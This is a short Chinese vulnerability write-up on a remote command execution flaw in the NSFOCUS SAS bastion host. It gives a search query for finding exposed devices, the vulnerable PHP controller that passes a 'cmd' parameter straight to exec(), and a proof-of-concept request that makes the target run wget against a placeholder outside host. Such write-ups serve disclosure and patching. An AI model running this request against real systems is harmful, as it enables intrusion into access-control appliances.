# 绿盟 SAS堡垒机 Exec 远程命令执行漏洞

## 漏洞描述

绿盟 SAS堡垒机 Exec 远程命令执行漏洞

## 漏洞影响

绿盟 SAS堡垒机

## 网络测绘

```
body="'/needUsbkey.php?username='"
```

## 漏洞复现

登陆页面

![image-20230828162656143](images/image-20230828162656143.png)

漏洞存在于文件 ExecController.php 文件中

![image-20230828162917436](images/image-20230828162917436.png)

```
<?php
  require_once 'Nsc/Websvc/Response.php';
class ExecController extends Cavy_Controller_Action {

  var $models = 'no';

  public function index() {
    $command = $this->_params['cmd'];
    $ret = 0;
    $output = array();
    exec($command,$output,$ret);
    $result = new StdClass;
    if ($ret != 0) {
      $result->code = Nsc_Websvc_Response::EXEC_ERROR;
      $result->text = "exec error";
    }
    else {
      $result->code = Nsc_Websvc_Response::SUCCESS;
      //			$result->text = implode("\n",$output);
      $result->text = "WEBSVC OK";
    }
    $this->_render(array('result'=>$result),'/websvc/result');
  }
}
?>
```

验证POC

```
/webconf/Exec/index?cmd=wget%20xxx.xxx.xxx
```

![image-20230828162933312](images/image-20230828162933312.png)

![image-20230828162948491](images/image-20230828162948491.png)